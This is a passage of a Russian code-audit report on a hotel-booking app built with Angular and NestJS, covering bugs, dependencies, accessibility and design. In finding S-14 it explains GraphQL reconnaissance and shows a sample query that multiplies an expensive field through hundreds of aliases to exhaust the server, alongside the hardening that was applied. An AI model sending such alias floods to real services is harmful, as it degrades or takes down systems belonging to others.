**Что делать:** уникальный индекс на `email`, обработка `E11000` → `ConflictException`, нормализация к нижнему регистру.

---

#### ✅ V-16. `@angular/material` и `@angular/cdk` в devDependencies
[package.json:37-38](hotelBooking_angular_front/package.json#L37-L38) — обе библиотеки рантайм-зависимости, но лежат в `devDependencies`. Там же `@ngrx/effects` и `@ngrx/store`, продублированные в обеих секциях.

**Последствие:** `npm ci --omit=dev` в CI/Docker ломает сборку.

**Что делать:** перенести в `dependencies`, убрать дубликаты.

---

#### ✅ V-17. Тесты фронтенда невозможно запустить
В [angular.json](hotelBooking_angular_front/angular.json) нет таргета `test`, в `devDependencies` нет ни karma, ни jest, ни `@angular/platform-browser-dynamic/testing`. При этом в проекте лежат **15 `.spec.ts` файлов** (`auth.effects.spec.ts`, `hotels.reducer.spec.ts`, `booking.selectors.spec.ts` и др.), а `package.json` объявляет `"test": "ng test"`.

**Последствие:** `npm test` падает; тесты — мёртвый груз, дающий ложное ощущение покрытия.

**Что делать:** либо подключить runner (`ng add @angular/build:karma` / jest-preset-angular) и починить спеки, либо удалить их вместе со скриптом.

---

#### ✅ V-18. Конфликт версий Tailwind
[package.json](hotelBooking_angular_front/package.json) содержит одновременно `tailwindcss@^3.4.17` и `@tailwindcss/postcss@^4.2.1` (пакет для Tailwind v4). [postcss.config.js](hotelBooking_angular_front/postcss.config.js) использует v3-схему (`plugins: { tailwindcss: {} }`), а [styles.scss](hotelBooking_angular_front/src/styles.scss) — v3-директивы `@tailwind base/components/utilities`.

**Последствие:** лишний несовместимый пакет в дереве зависимостей, риск сломать сборку при `npm update`.

**Что делать:** выбрать одну мажорную версию и убрать вторую.

---

## 🟡 Средние

#### ⏸ S-1. Дублирование транспортов: REST и GraphQL живут параллельно
После перехода на Apollo ([GRAPHQL.md](GRAPHQL.md)) REST-контроллеры остались и покрывают те же операции. `Api` ([api.ts](hotelBooking_angular_front/src/app/core/api.ts)) содержит ~30 методов, из которых реально используются единицы (загрузка файлов, поддержка, `authLogout`), остальные дублируют `ApolloService`.

**Последствие:** два места правки на каждое изменение контракта, два набора авторизационных проверок (у REST и GraphQL-версий `supportMessages` они, например, разошлись — см. [C-3](#c-3-idor-чтение-чужой-переписки-с-поддержкой)).

**Что делать:** зафиксировать GraphQL как единственный транспорт данных, оставить REST только для multipart-загрузок, удалить неиспользуемые методы `Api`.

---

#### ⏸ S-2. Страница «Поддержка» игнорирует NgRx
[support.ts](hotelBooking_angular_front/src/app/pages/support/support.ts) работает напрямую через `Api`, хранит состояние в полях компонента и вручную дёргает `cdr.detectChanges()`. При этом полный NgRx-слайс существует и не используется никем: [support.actions.ts](hotelBooking_angular_front/src/app/actions/support.actions.ts), [support.effects.ts](hotelBooking_angular_front/src/app/effects/support.effects.ts), [support.reducer.ts](hotelBooking_angular_front/src/app/reducers/support.reducer.ts), [support.selectors.ts](hotelBooking_angular_front/src/app/selectors/support.selectors.ts).

Иронично, что эффекты уже ходят через `ApolloService` (рабочий путь), а компонент — через `Api` (нерабочий, см. [C-13](#c-13-чат-поддержки-обращается-к-несуществующим-rest-эндпоинтам)).

**Что делать:** перевести страницу на существующие actions/selectors — это заодно чинит C-13 для чтения.

---

#### ⏸ S-3. Тот же паттерн на страницах админки
[admin-hotels.ts](hotelBooking_angular_front/src/app/pages/admin-hotels/admin-hotels.ts), [admin-rooms.ts](hotelBooking_angular_front/src/app/pages/admin-rooms/admin-rooms.ts), [manager-reservations.ts](hotelBooking_angular_front/src/app/pages/manager-reservations/manager-reservations.ts) — прямые вызовы `Api`, локальные флаги `loading`/`saving`, ручной `detectChanges`. Ни один не использует `ChangeDetectionStrategy.OnPush`, кроме `admin-users`.

**Что делать:** привести к единому подходу (NgRx или signals + `resource()`), включить `OnPush` везде.

---

#### ✅ S-4. Мёртвый NgRx-слайс `booking`
[booking.actions.ts](hotelBooking_angular_front/src/app/actions/booking.actions.ts), [booking.effects.ts](hotelBooking_angular_front/src/app/effects/booking.effects.ts), [booking.reducer.ts](hotelBooking_angular_front/src/app/reducers/booking.reducer.ts), [booking.selectors.ts](hotelBooking_angular_front/src/app/selectors/booking.selectors.ts) зарегистрированы в [app.config.ts:38](hotelBooking_angular_front/src/app/app.config.ts#L38) и не используются ни одним компонентом.

**Что делать:** удалить или задействовать (логичный кандидат — состояние мастера бронирования, см. [D-9](#d-9-бронирование-просится-в-matstepper)).

---

#### ✅ S-5. Дефолтный шаблон Angular CLI не удалён
[app.html](hotelBooking_angular_front/src/app/app.html) — 342 строки заглушки CLI (логотип Angular, «Congratulations! Your app is running 🎉», ссылки на angular.dev). Файл не подключён — [app.ts:7](hotelBooking_angular_front/src/app/app.ts#L7) использует инлайновый `template: '<router-outlet />'`, — то есть это чистый мусор. [app.scss](hotelBooking_angular_front/src/app/app.scss) пуст и тоже не подключён.

**Что делать:** удалить оба файла.

---

#### ✅ S-6. Нет ленивой загрузки маршрутов
[app.routes.ts](hotelBooking_angular_front/src/app/app.routes.ts) импортирует все 11 страниц статически. Админские страницы, менеджерские таблицы и чат попадают в initial bundle к анонимному посетителю.

**Что делать:** `loadComponent: () => import('./pages/...')` для всех страниц за guard'ами.

---

#### ✅ S-7. Нет страниц 404/403
[app.routes.ts:65](hotelBooking_angular_front/src/app/app.routes.ts#L65) — `{ path: '**', redirectTo: 'hotels' }`. Опечатка в URL молча уводит на главную. `roleGuard` при нехватке прав тоже редиректит на `/hotels` без объяснения.

**Что делать:** компоненты `NotFound` / `Forbidden` с внятным текстом и кнопкой возврата.

---

#### 🟡 S-8. `Passport LocalStrategy` наполовину подключён
[auth.controller.ts:10](hotelBooking_nest_back/src/Controllers/auth.controller.ts#L10) использует `AuthGuard("local")` корректно, но GraphQL-мутация [auth.resolver.ts:26](hotelBooking_nest_back/src/GraphQL/resolvers/auth.resolver.ts#L26) вызывает `validateUser` напрямую. Два пути аутентификации с разной обработкой ошибок.

**Что делать:** единая точка — сервис; стратегию оставить только там, где она реально нужна.

> **Осталось:** REST-вход по-прежнему идёт через `AuthGuard("local")`, GraphQL-мутация —
> напрямую через `validateUser`. Обработка ошибок у них теперь одинаковая
> (оба отвечают 401 с текстом «Неверный адрес или пароль»), но два пути входа сохранились.
> Полное объединение упирается в [S-1](#-s-1-дублирование-транспортов-rest-и-graphql-живут-параллельно), который отложен.

---

#### ✅ S-9. Guard на методе, который не является обработчиком
[supportChat.gateway.ts:23-24](hotelBooking_nest_back/src/Providers/supportChat.gateway.ts#L23-L24): `@UseGuards(WsGuardforSendMesg)` навешан на `sendRequest()` — обычный метод без `@SubscribeMessage`. Guard не выполняется никогда.

**Что делать:** убрать декоратор — он создаёт ложное впечатление защищённости.

---

#### ✅ S-10. WS-guard'ы падают на отсутствующем заголовке
[wsguardforrequest.ts:11](hotelBooking_nest_back/src/Auth/wsguardforrequest.ts#L11) и [wsguardforsendmesg.ts:12](hotelBooking_nest_back/src/Auth/wsguardforsendmesg.ts#L12): `handshake.headers.authorization.split(" ")[1]` — без заголовка это `TypeError`, а не `UnauthorizedException`. Дальше идёт `if (!bearerToken)`, до которого исполнение уже не доходит. Плюс после каждого `throw` стоит недостижимый `return false`.

**Что делать:** проверять наличие заголовка до `split`, убрать мёртвые `return`.

---

#### ⬜ S-11. Жёсткий отказ вместо мягкого удаления
[hotels.provider.ts:72](hotelBooking_nest_back/src/Providers/hotels.provider.ts#L72) и [rooms.provider.ts:58](hotelBooking_nest_back/src/Providers/rooms.provider.ts#L58) — `findByIdAndDelete` без каких-либо проверок связей.

**Последствие:** удаление номера с активными бронями оставляет «висячие» брони, а `getHotelandRoom` на них бросает `BadRequestException` → страница «Все бронирования» падает целиком.

**Что делать:** soft delete (`deletedAt`) или проверка активных броней перед удалением с понятной ошибкой.

---

#### ✅ S-12. `normalizeImageForClient` — 57 строк угадывания формата
[image.utils.ts](hotelBooking_nest_back/src/utils/image.utils.ts) перебирает 7 вариантов представления картинки (Buffer, Uint8Array, `.buffer`, `.data`, строка, любой ключ объекта…). Это симптом того, что формат хранения не зафиксирован: `Hotel.image` объявлен как `string`, `Room.images` — как `[Buffer]`, а на запись идёт то base64-строка, то Buffer.

MIME при этом всегда `image/jpeg` — PNG и WebP отдаются с неверным типом.

**Что делать:** зафиксировать один формат хранения (см. [V-8](#v-8-изображения-хранятся-в-mongodb-в-base64)), функцию сократить до одной ветки, хранить реальный MIME.

---

#### ✅ S-13. Мутирующие ответы `printFormat*` расходятся между методами
[hotels.provider.ts:39-45](hotelBooking_nest_back/src/Providers/hotels.provider.ts#L39-L45): `getAllHotels` перезаписывает `image` нормализованной версией поверх результата `printFormatHotel`, а `createHotel`/`editHotel` возвращают сырое значение.

**Последствие:** созданный отель приходит на фронт с картинкой в другом формате, чем при последующей загрузке списка.

**Что делать:** нормализовать внутри `printFormatHotel`.

---

#### 🟡 S-14. GraphQL-эндпоинт не защищён от разведки и тяжёлых запросов

##### Что было
[app.module.ts](hotelBooking_nest_back/src/app.module.ts) регистрировал `GraphQLModule.forRoot`
с четырьмя параметрами: драйвер, `autoSchemaFile`, `sortSchema` и `context`.
Ни одной настройки безопасности.

```typescript
GraphQLModule.forRoot<ApolloDriverConfig>({
  driver: ApolloDriver,
  autoSchemaFile: join(process.cwd(), "src/schema.gql"),
  sortSchema: true,
  context: ({ req }) => ({ req }),
}),
```

##### Из чего складывается проблема

**1. Introspection открыта наружу.**
GraphQL умеет описывать сам себя: запрос `__schema` возвращает полный список типов,
полей, аргументов и мутаций. Для атакующего это готовая карта API — не нужно
угадывать имена эндпоинтов, схема расскажет о них сама. В связке с уже найденными
дырами ([C-3](#c-3-idor-чтение-чужой-переписки-с-поддержкой) — чтение чужих обращений)
это ускоряет разведку с часов до минут: видно и `supportMessages(requestId: String!)`,
и то, какие поля он отдаёт.

**2. Playground поднимался в проде.**
`@nestjs/apollo` без явного `playground: false` включает интерактивную песочницу.
Это работающая консоль к боевому API по публичному адресу — с автодополнением,
историей запросов и документацией по схеме.

**3. Нет лимита глубины запроса.**
GraphQL-запросы могут быть рекурсивными, если в схеме есть циклическая связь.
В текущей схеме прямого цикла нет — `RoomType` ссылается на `HotelType`, но не наоборот,
поэтому вложенность ограничена двумя уровнями. Это временное свойство схемы,
а не защита: стоит добавить `HotelType.rooms` (а это напрашивается для
[D-6](#d-6-карточка-отеля-не-продаёт)), и появится цикл `hotel → rooms → hotel → rooms…`.
Один запрос глубиной 15 уровней превращается в тысячи обращений к базе.

**4. Нет ограничения сложности.**
Даже без рекурсии одним запросом можно попросить всё сразу:

```graphql
query {
  a: hotels(dateArrival: "2026-01-01", dateDeparture: "2026-01-02") { id title image }
  b: hotels(dateArrival: "2026-02-01", dateDeparture: "2026-02-02") { id title image }
  # ... и так пятьсот алиасов
}
```

Алиасы позволяют вызвать один и тот же запрос сколько угодно раз в пределах
одного HTTP-запроса. Rate limiting здесь бессилен: для `@nestjs/throttler` это
один запрос. А поскольку `image` — это base64-строка целиком
([V-8](#v-8-изображения-хранятся-в-mongodb-в-base64)), пятьсот алиасов по десять
отелей дают сотни мегабайт в ответе.

**5. Ошибки уходили клиенту как есть.**
Без `formatError` Apollo отдаёт `extensions.exception.stacktrace` — полный стек Nest
с путями к файлам и внутренней структурой проекта.

##### Что сделано

```typescript
GraphQLModule.forRootAsync<ApolloDriverConfig>({
  driver: ApolloDriver,
  imports: [ConfigModule],
  useFactory: (configService: ConfigService) => {
    const isProd = configService.get("NODE_ENV") === "production";
    return {
      autoSchemaFile: join(process.cwd(), "src/schema.gql"),
      sortSchema: true,
      context: ({ req, res }) => ({ req, res }),
      introspection: !isProd,
      playground: !isProd,
      formatError: (error) => ({
        message: error.message,
        path: error.path,
        code: error.extensions?.code,
      }),
    };
  },
  inject: [ConfigService],
}),
```

Закрыто: пункты 1, 2 и 5. В разработке песочница и introspection остаются —
без них неудобно работать; в проде отключаются по `NODE_ENV`.

##### Что осталось

Лимиты глубины и сложности не добавлены — нужны отдельные пакеты и калибровка
порогов под реальные запросы клиента.

```bash
npm i graphql-depth-limit graphql-query-complexity
```

```typescript
import depthLimit from "graphql-depth-limit";
import { createComplexityLimitRule } from "graphql-validation-complexity";

// в конфиг GraphQLModule:
validationRules: [
  depthLimit(7),
  createComplexityLimitRule(1000, {
    onCost: (cost) => logger.debug(`Стоимость запроса: ${cost}`),
  }),
],
```

Порог 7 покрывает самый глубокий запрос в приложении
(`hotelRooms → hotel → description` — три уровня) с большим запасом.
Значение сложности 1000 нужно подобрать по логам `onCost` на реальном трафике:
сначала включить только логирование, посмотреть распределение за неделю,
затем поставить лимит выше 99-го процентиля.

Отдельно стоит ограничить размер тела запроса
(`app.use(json({ limit: '100kb' }))`) — это дешёвая защита от запросов
с тысячами алиасов, не требующая новых зависимостей.

---

#### ✅ S-15. Отсутствуют базовые security-заголовки и настройка порта
[main.ts](hotelBooking_nest_back/src/main.ts): нет `helmet`, нет глобального префикса, порт `7000` захардкожен (при том что `SERVER_PORT` есть в `.env` и пробрасывается в docker-compose), CORS-origin — литеральный массив с внутренним IP `10.8.144.42`.

**Что делать:** `helmet()`, `app.listen(configService.get('SERVER_PORT') ?? 7000)`, origin из переменной окружения.

---

#### ✅ S-16. `credentialsInterceptor` шлёт `withCredentials` во все запросы
[credentials-interceptor.ts](hotelBooking_angular_front/src/app/core/credentials-interceptor.ts) добавляет `withCredentials: true` абсолютно ко всем HTTP-вызовам, хотя cookie-аутентификация отключена (закомментирована на бэкенде).

**Что делать:** удалить интерцептор либо ограничить его собственным API-хостом — иначе он вернётся в строй вместе с cookie-схемой из [C-7](#c-7-токены-в-localstorage).

---

#### 🟡 S-17. Устаревшие и неиспользуемые зависимости
- Бэкенд: NestJS **9.x** (текущая — 11), `mongoose@^6` (EOL), `@types/node@18`, `typescript@4.7`, `prettier@2` в дев-зависимостях против `prettier@3` на фронте.
- Фронт: `@angular/material-moment-adapter` установлен, но `moment` отсутствует и адаптер нигде не импортируется; `@ngrx/entity` установлен и не используется.
- `provideAnimationsAsync()` ([app.config.ts](hotelBooking_angular_front/src/app/app.config.ts)) — устаревший API в Angular 21, заменяется на `provideAnimations()`.

> **Сделано:** `provideAnimations()` вместо устаревшего API; удалены неиспользуемые
> `@angular/material-moment-adapter` и `@ngrx/entity`; убран дублирующий
> `@tailwindcss/postcss` v4 при Tailwind v3 ([V-18](#-v-18-конфликт-версий-tailwind));
> `prettier` приведён к общей конфигурации в корне.
>
> **Осталось:** бэкенд на NestJS 9 и Mongoose 6 (обе версии сняты с поддержки).
> Обновление до Nest 11 и Mongoose 8 — отдельная задача с проверкой всех breaking changes,
> в том числе смены API у `@nestjs/throttler` (v4 → v5 меняет формат конфигурации и декоратора).

---

#### ✅ S-18. `provideStoreDevtools` включён в production-сборке
[app.config.ts:47-50](hotelBooking_angular_front/src/app/app.config.ts#L47-L50) регистрируется безусловно, без `logOnly: environment.production` и без `!environment.production` в `connectInZone`.

**Последствие:** всё состояние приложения, включая данные пользователей, доступно через Redux DevTools в проде.

---

#### ✅ S-19. `schema.gql` генерируется в исходники и коммитится
[app.module.ts:32](hotelBooking_nest_back/src/app.module.ts#L32) пишет `src/schema.gql` при каждом старте. Файл лежит в репозитории и постоянно даёт diff.

**Что делать:** генерировать в `dist/` или добавить в `.gitignore`.

---

#### ✅ S-20. Устаревшие опции подключения Mongoose
[app.module.ts:24-25](hotelBooking_nest_back/src/app.module.ts#L24-L25) — `useUnifiedTopology` и `useNewUrlParser` игнорируются начиная с Mongoose 6 и в 7+ вызывают предупреждения.

---

#### ✅ S-21. Нет индексов в схемах MongoDB
Ни в одной модели ([Models/](hotelBooking_nest_back/src/Models/)) нет `index: true`. Поиск идёт по `Reservation.dateStart/dateEnd/roomId/hotelId/userId`, `Room.hotel`, `Support.user/isActive`, `User.email` — всё коллекционным сканированием.

---

#### ✅ S-22. Логирование и обработка ошибок отсутствуют
Нет `Logger`, нет глобального `ExceptionFilter`. Повсеместно бросается голый `BadRequestException()` без сообщения ([users.provider.ts:33](hotelBooking_nest_back/src/Providers/users.provider.ts#L33), [hotels.provider.ts:37](hotelBooking_nest_back/src/Providers/hotels.provider.ts#L37), [rooms.provider.ts:44](hotelBooking_nest_back/src/Providers/rooms.provider.ts#L44) и др.) — клиент получает 400 «Bad Request» без причины, а «не найдено» неотличимо от «некорректный запрос» (должно быть 404).

---

#### ⏸ S-23. Мёртвый закомментированный код
[auth.controller.ts:17-18,32-39](hotelBooking_nest_back/src/Controllers/auth.controller.ts#L32-L39) (logout и cookie), [clientReservations.controller.ts:22-24](hotelBooking_nest_back/src/Controllers/clientReservations.controller.ts#L22-L24), [app.module.ts:23](hotelBooking_nest_back/src/app.module.ts#L23) (Atlas URI). Плюс директория [_old_frontend/](_old_frontend/) с целым React-приложением в репозитории.

---

#### ✅ S-24. `Api.authLogout()` бьёт в несуществующий эндпоинт
[api.ts:110](hotelBooking_angular_front/src/app/core/api.ts#L110) вызывает `POST /api/auth/logout`, которого нет (закомментирован). Эффект [auth.effects.ts:63-66](hotelBooking_angular_front/src/app/effects/auth.effects.ts#L63-L66) ловит ошибку и всё равно чистит токены — то есть выход работает «через catch». В консоли на каждый logout — 404.

---

#### ✅ S-25. Утечка blob-URL при загрузке изображений
[admin-hotels.ts:84](hotelBooking_angular_front/src/app/pages/admin-hotels/admin-hotels.ts#L84) и [admin-rooms.ts:111](hotelBooking_angular_front/src/app/pages/admin-rooms/admin-rooms.ts#L111) вызывают `URL.createObjectURL(file)` и никогда не делают `revokeObjectURL`. Каждый выбор файла удерживает его в памяти до перезагрузки страницы.

---

#### ✅ S-26. Подписки без отписки в компонентах
[hotels.ts:47-64](hotelBooking_angular_front/src/app/pages/hotels/hotels.ts#L47-L64) — пять `.subscribe()` в конструкторе без `takeUntilDestroyed()`. [hotel-details.ts:60](hotelBooking_angular_front/src/app/pages/hotel-details/hotel-details.ts#L60) — то же. [shell.ts:39](hotelBooking_angular_front/src/app/layout/shell/shell.ts#L39) спасает `take(1)`.

---

#### ✅ S-27. `setTimeout(..., 0)` вместо жизненного цикла
[hotels.ts:67](hotelBooking_angular_front/src/app/pages/hotels/hotels.ts#L67) — `setTimeout(() => this.setDefaultDatesAndLoad(), 0)` в конструкторе, чтобы обойти порядок инициализации.

**Что делать:** перенести в `ngOnInit`.

---

#### ✅ S-28. Даты формируются через `toISOString()` — сдвиг на день
[hotels.ts:75-76](hotelBooking_angular_front/src/app/pages/hotels/hotels.ts#L75-L76) и [hotel-details.ts:56-57](hotelBooking_angular_front/src/app/pages/hotel-details/hotel-details.ts#L56-L57) делают `new Date().toISOString().slice(0,10)`, что даёт дату в **UTC**.

**Последствие:** для пользователя в UTC+3 после 21:00 подставляется завтрашний день; для UTC-5 утром — вчерашний. Бронирование уезжает на сутки.

**Что делать:** формировать дату по локальному времени или перейти на `MatDatepicker` с адаптером (см. [D-5](#d-5-нативные-date-инпуты-вместо-matdatepicker)).

---

#### ✅ S-29. Определение типа поиска по regex ломается на пробеле
[admin-users.ts:113](hotelBooking_angular_front/src/app/pages/admin-users/admin-users.ts#L113):

```ts
} else if (/[\d\+\-\(\)\s]/.test(searchQuery)) { searchParams.contactPhone = searchQuery; }
```

Условие срабатывает, если в строке есть **хотя бы один** пробел или цифра. Запрос «Иван Петров» уходит в поиск по телефону и не находит ничего.

**Что делать:** искать по всем трём полям через `$or` либо явный переключатель типа поиска в UI.

---

#### ⬜ S-30. `e2e`-тест бэкенда не соответствует коду
[test/reservations.e2e-spec.ts](hotelBooking_nest_back/test/reservations.e2e-spec.ts) — единственный тест на весь бэкенд, при этом `jest.rootDir` в [package.json:79](hotelBooking_nest_back/package.json#L79) указан как `src`, то есть `npm test` его вообще не видит. Юнит-тестов нет ни на один провайдер.

---

## 🟢 Лёгкие

#### ✅ L-1. Смешение языков в интерфейсе
- Русский: сайдбар ([shell.html](hotelBooking_angular_front/src/app/layout/shell/shell.html)), поддержка, админ-отели, админ-номера, менеджерские брони.
- Английский: «Hotels», «Search by name and availability window», «Reload» ([hotels.html](hotelBooking_angular_front/src/app/pages/hotels/hotels.html)); «Login», «Use your email and password» ([login.html](hotelBooking_angular_front/src/app/pages/login/login.html)); «Register» ([register.html](hotelBooking_angular_front/src/app/pages/register/register.html)); «Reservations», «Your bookings», «Delete» ([reservations.html](hotelBooking_angular_front/src/app/pages/reservations/reservations.html)); «Hotel details», «Back» ([hotel-details.html](hotelBooking_angular_front/src/app/pages/hotel-details/hotel-details.html)); вся страница [admin-users.html](hotelBooking_angular_front/src/app/pages/admin-users/admin-users.html) и [manager-users.html](hotelBooking_angular_front/src/app/pages/manager-users/manager-users.html).

Иногда даже внутри одной карточки: заголовок «Hotel details» и кнопка «Забронировать».

**Что делать:** выбрать язык (логично русский) и вычистить; при планах на мультиязычность — `@angular/localize`.

---

#### ✅ L-2. `lang="en"` при русском контенте
[index.html:2](hotelBooking_angular_front/src/index.html#L2). Влияет на скринридеры, переносы и автоперевод.

---

#### ✅ L-3. Дефолтные метаданные страницы
[index.html:5](hotelBooking_angular_front/src/index.html#L5) — `<title>HotelBookingAngularFront</title>`, дефолтная `favicon.ico` от CLI, нет `<meta name="description">`, нет `theme-color`, нет OG-тегов.

---

#### ✅ L-4. Даты выводятся сырыми ISO-строками
[reservations.html:18](hotelBooking_angular_front/src/app/pages/reservations/reservations.html#L18) — `{{ r.dateStart }} → {{ r.dateEnd }}` печатает `2026-05-01T00:00:00.000Z`. [support.html:79](hotelBooking_angular_front/src/app/pages/support/support.html#L79) — `{{ msg.createdAt | slice:0:10 }}`, то есть обрезка строки вместо форматирования, и время сообщения теряется.

**Что делать:** `| date:'dd.MM.yyyy'` и `| date:'HH:mm'` (в [manager-reservations.html](hotelBooking_angular_front/src/app/pages/manager-reservations/manager-reservations.html) это уже сделано правильно).

---

#### 🟡 L-5. Названия номеров захардкожены по индексу
[hotel-details.html:29](hotelBooking_angular_front/src/app/pages/hotel-details/hotel-details.html#L29):

```html
<mat-card-title>{{ i === 0 ? 'Стандарт' : 'Люкс' }}</mat-card-title>
```

Первый номер всегда «Стандарт», все остальные — «Люкс». У модели `Room` вообще нет поля с названием.

**Что делать:** добавить `title` в схему номера и выводить его.

> **Сделано:** захардкоженные названия убраны, карточка показывает реальное описание номера.
>
> **Осталось:** поля `title` в модели `Room` по-прежнему нет — добавление потребует
> миграции существующих записей и правки формы в админке.

---

#### ✅ L-6. Форма поиска отелей ничего не ищет по кнопке Enter корректно
[hotels.html:9-26](hotelBooking_angular_front/src/app/pages/hotels/hotels.html#L9-L26): `<form (ngSubmit)="reload()">` обёрнута вокруг полей, но кнопки `type="submit"` внутри нет — единственная кнопка «Reload» стоит **вне** формы ([:6](hotelBooking_angular_front/src/app/pages/hotels/hotels.html#L6)). Enter в поле работает, клик по кнопке — тоже, но семантика формы разорвана, а поле поиска при вводе не запускает поиск (только пишет term в стор).

**Что делать:** внести кнопку в форму с `type="submit"`, добавить debounce на поле поиска.

---

#### ✅ L-7. Нативный `confirm()` вместо `MatDialog`
[admin-hotels.ts:117](hotelBooking_angular_front/src/app/pages/admin-hotels/admin-hotels.ts#L117), [admin-rooms.ts:143](hotelBooking_angular_front/src/app/pages/admin-rooms/admin-rooms.ts#L143). А удаление брони ([reservations.html:24](hotelBooking_angular_front/src/app/pages/reservations/reservations.html#L24), [manager-reservations.html:47](hotelBooking_angular_front/src/app/pages/manager-reservations/manager-reservations.html#L47)) вообще не спрашивает подтверждения.

---

#### ✅ L-8. Ложное сообщение об успехе
[admin-users.ts:130](hotelBooking_angular_front/src/app/pages/admin-users/admin-users.ts#L130) показывает «User created successfully» сразу после `dispatch`, не дожидаясь ответа. При ошибке пользователь видит и «успех», и «Error loading users».

---

#### ✅ L-9. Нет `mat-error` в большинстве форм
[login.html](hotelBooking_angular_front/src/app/pages/login/login.html), [register.html](hotelBooking_angular_front/src/app/pages/register/register.html), [admin-hotels.html](hotelBooking_angular_front/src/app/pages/admin-hotels/admin-hotels.html), [admin-rooms.html](hotelBooking_angular_front/src/app/pages/admin-rooms/admin-rooms.html) — валидаторы есть, сообщений нет. Поле краснеет молча. Сделано только в [admin-users.html](hotelBooking_angular_front/src/app/pages/admin-users/admin-users.html) и частично в [support.html](hotelBooking_angular_front/src/app/pages/support/support.html).

---

#### ✅ L-10. Нет атрибутов `autocomplete` и переключателя видимости пароля
Поля email/password в [login.html](hotelBooking_angular_front/src/app/pages/login/login.html) и [register.html](hotelBooking_angular_front/src/app/pages/register/register.html) без `autocomplete="email" | "current-password" | "new-password"` — менеджеры паролей работают плохо. Нет кнопки «показать пароль», нет подтверждения пароля и минимальной длины при регистрации.

---

#### ✅ L-11. Пустое состояние и заголовок отсутствуют на части страниц
На страницах «Отели» ([hotels.html](hotelBooking_angular_front/src/app/pages/hotels/hotels.html)), «Мои брони» ([reservations.html](hotelBooking_angular_front/src/app/pages/reservations/reservations.html)) и «Детали отеля» ([hotel-details.html](hotelBooking_angular_front/src/app/pages/hotel-details/hotel-details.html)) при пустом результате показывается просто ничего — белый экран под заголовком.

---

#### ✅ L-12. Неинформативные `alt` у изображений
`alt="hotel"`, `alt="room"`, `alt="preview"` — одинаковые для всех карточек. Должно быть название отеля/номера.

---

#### ✅ L-13. Кликабельные элементы недоступны с клавиатуры
- [shell.html:61](hotelBooking_angular_front/src/app/layout/shell/shell.html#L61) — `<a mat-list-item (click)="logout()" style="cursor:pointer">` без `href`, `role="button"` и `tabindex`.
- [support.html:25-29](hotelBooking_angular_front/src/app/pages/support/support.html#L25-L29) — `<mat-card (click)="openRequest(req)">` без `tabindex="0"` и обработки Enter/Space.

---

#### ✅ L-14. Инлайновые стили вместо классов
`style="font-size: 48px; height: 48px; width: 48px;"` и `style="font-size: 20px;"` многократно в [admin-users.html](hotelBooking_angular_front/src/app/pages/admin-users/admin-users.html) и [manager-users.html](hotelBooking_angular_front/src/app/pages/manager-users/manager-users.html).

---

#### ✅ L-15. Дублирование разметки между `admin-users` и `manager-users`
[admin-users.html](hotelBooking_angular_front/src/app/pages/admin-users/admin-users.html) и [manager-users.html](hotelBooking_angular_front/src/app/pages/manager-users/manager-users.html) — почти идентичные таблицы, пагинация и пустые состояния, скопированные целиком.

**Что делать:** общий компонент `UsersTable` с `@Input()` для колонок и режима.

---

#### ✅ L-16. `role.guard` небезопасен при самостоятельном использовании
[role.guard.ts:13](hotelBooking_angular_front/src/app/core/role.guard.ts#L13) берёт `take(1)` сразу, полагаясь на то, что `authGuard` отработал раньше и уже загрузил пользователя. Работает только потому, что в [app.routes.ts](hotelBooking_angular_front/src/app/app.routes.ts) они всегда указаны парой в правильном порядке.

---

#### ✅ L-17. Неиспользуемые импорты и поля
[support.ts:2](hotelBooking_angular_front/src/app/pages/support/support.ts#L2) импортирует `AsyncPipe`, который не попадает в `imports` компонента и не используется; поле `user$` ([:27](hotelBooking_angular_front/src/app/pages/support/support.ts#L27)) объявлено, но шаблон работает с `userRole`. [rooms.provider.ts:5](hotelBooking_nest_back/src/Providers/rooms.provider.ts#L5) импортирует `HotelDocument` только ради типа параметра.

---

#### ✅ L-18. Тестовые учётные записи с паролями в README
[README.md](README.md#тестовые-аккаунты) публикует email и пароли администратора, менеджера и клиента. Для демо допустимо, но лучше вынести в локальный `SEED.md` вне репозитория или сгенерировать через seed-скрипт.

---

#### ✅ L-19. Разные конфиги форматирования
Бэкенд — `prettier@2` + `.eslintrc.js` (устаревший формат), кавычки двойные. Фронт — `prettier@3`, кавычки одинарные, ESLint не настроен вовсе. Единого `.editorconfig` на монорепо нет.

---

## 🎨 Оценка дизайна

Основа выбрана верно: **Angular Material 3** (в [styles.scss](hotelBooking_angular_front/src/styles.scss) подключён `mat.theme()` с системными CSS-переменными) плюс Tailwind для раскладки. Но сейчас используется примерно 30% возможностей M3 — визуально это выглядит как каркас без стилизации. Ниже — что конкретно даст прирост.

### 🔴 Критично для внешнего вида

#### ✅ D-1. Bootstrap-классы в разметке, а Bootstrap не установлен
[admin-users.html](hotelBooking_angular_front/src/app/pages/admin-users/admin-users.html) и [manager-users.html](hotelBooking_angular_front/src/app/pages/manager-users/manager-users.html) построены на классах Bootstrap: `container-fluid`, `row`, `col-md-6`, `g-4`, `me-2`, `ms-1`, `fw-semibold`, `fw-bold`, `badge`, `bg-primary`, `bg-success`, `bg-info`, `bg-light`, `text-muted`, `text-white`, `text-dark`, `alert alert-danger`, `shadow-sm`, `w-100`, `flex-grow-1`, `table-responsive`, `border-top`, `border-bottom`, `p-5`. В [package.json](hotelBooking_angular_front/package.json) Bootstrap отсутствует, в [tailwind.config.js](hotelBooking_angular_front/tailwind.config.js) таких утилит нет.

**Как это выглядит сейчас:**
- `col-md-6` не работает → поля формы создания пользователя идут в один столбец на всю ширину вместо сетки 2×3.
- `badge bg-primary text-white` не работает → роли выводятся простым чёрным текстом без цветных плашек, ради которых всё и писалось.
- `alert alert-danger` не работает → ошибка выглядит как обычный абзац.
- `me-2` / `ms-1` не работают → иконки вплотную прилипают к тексту.
- `text-muted` не работает → «второстепенный» текст того же цвета, что основной.
- `shadow-sm`, `border-top`, `border-bottom` не работают → карточки и таблицы без разделителей.

Это самая заметная визуальная проблема в проекте — две страницы выглядят как несвёрстанный черновик.

**Что делать:** переписать обе страницы на Tailwind + M3-токены. Роли — через `mat-chip` с `highlighted`; ошибки — через `MatSnackBar` или карточку с `--mat-sys-error-container`; сетку формы — `grid grid-cols-1 md:grid-cols-2 gap-4`.

---

#### ✅ D-2. Все сообщения в чате выглядят как свои
[support.html:77](hotelBooking_angular_front/src/app/pages/support/support.html#L77):

```html
<div class="rounded-lg px-3 py-2 text-sm max-w-xs bg-teal-100 self-end">
```

